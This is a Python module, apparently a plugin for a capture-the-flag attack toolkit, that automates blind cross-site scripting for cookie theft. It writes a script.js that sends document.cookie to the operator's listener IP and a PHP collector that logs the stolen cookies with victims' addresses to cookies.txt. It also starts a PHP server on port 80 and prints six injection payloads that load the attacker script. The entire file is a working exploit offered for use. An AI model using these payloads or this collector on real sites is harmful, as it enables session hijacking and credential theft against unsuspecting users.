import subprocess
from pathlib import Path

from core.attacker import resolve_lhost

PROVIDES = []
REQUIRES = []

G = "\033[92m"
C = "\033[96m"
B = "\033[94m"
Y = "\033[93m"
R = "\033[91m"
W = "\033[0m"
BOLD = "\033[1m"


PAYLOADS = [
    "<script src=http://{ip}/script.js></script>",
    "'><script src=http://{ip}/script.js></script>",
    "\"><script src=http://{ip}/script.js></script>",
    "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'http://{ip}/script.js\\';document.body.appendChild(a)')",
    "<script>function b(){{eval(this.responseText)}};a=new XMLHttpRequest();a.addEventListener('load',b);a.open('GET','//{ip}/script.js');a.send();</script>",
    "<script>$.getScript('http://{ip}/script.js')</script>",
]


def run(data, cred, args):

    #
    # ---------------------------------------------------------
    # LHOST
    # ---------------------------------------------------------
    #

    ip = resolve_lhost()

    if not ip:

        print(f"\n{R}[!] Failed to determine callback IP.{W}\n")
        return

    ip = input(
        f"{Y}Listener IP [{ip}]> {W}"
    ).strip() or ip

    #
    # ---------------------------------------------------------
    # DIRECTORY
    # ---------------------------------------------------------
    #

    outdir = Path("/tmp/ctf_xss")
    outdir.mkdir(
        parents=True,
        exist_ok=True,
    )

    #
    # ---------------------------------------------------------
    # SCRIPT.JS
    # ---------------------------------------------------------
    #

    script = f"""new Image().src="http://{ip}/index.php?c="+encodeURIComponent(document.cookie);"""

    (outdir / "script.js").write_text(script)

    #
    # ---------------------------------------------------------
    # INDEX.PHP
    # ---------------------------------------------------------
    #

    php = """<?php

if(isset($_GET['c'])){

    foreach(explode(";", urldecode($_GET['c'])) as $cookie){

        file_put_contents(
            "cookies.txt",
            "[".date("Y-m-d H:i:s")."] ".
            $_SERVER["REMOTE_ADDR"].
            " -> ".
            trim($cookie).
            PHP_EOL,
            FILE_APPEND
        );
    }

    echo "OK";
}

?>
"""

    (outdir / "index.php").write_text(php)

    #
    # ---------------------------------------------------------
    # START SERVER
    # ---------------------------------------------------------
    #

    print()
    print(f"{G}[+] Starting PHP server...{W}\n")

    try:

        subprocess.Popen(
            [
                "x-terminal-emulator",
                "-e",
                f"bash -c 'cd {outdir}; php -S 0.0.0.0:80'"
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    except Exception as e:

        print(
            f"{R}[!] Failed to start server:{W} {e}"
        )

        return
    #
    # ---------------------------------------------------------
    # PAYLOADS
    # ---------------------------------------------------------
    #

    print(f"{G}[+] Files{W}\n")

    print(f"  {B}├──{W} {C}{outdir/'index.php'}{W}")
    print(f"  {B}├──{W} {C}{outdir/'script.js'}{W}")
    print(f"  {B}└──{W} {C}{outdir/'cookies.txt'}{W}")

    print()

    print(f"{G}[+] Blind XSS Payloads{W}\n")

    for i, payload in enumerate(PAYLOADS, 1):

        print(f"{B}[{i}]{W}")
        print(payload.format(ip=ip))
        print()

    print(f"{G}[+] Cookies will be written to:{W}")
    print(f"    {C}{outdir/'cookies.txt'}{W}\n")

    return data
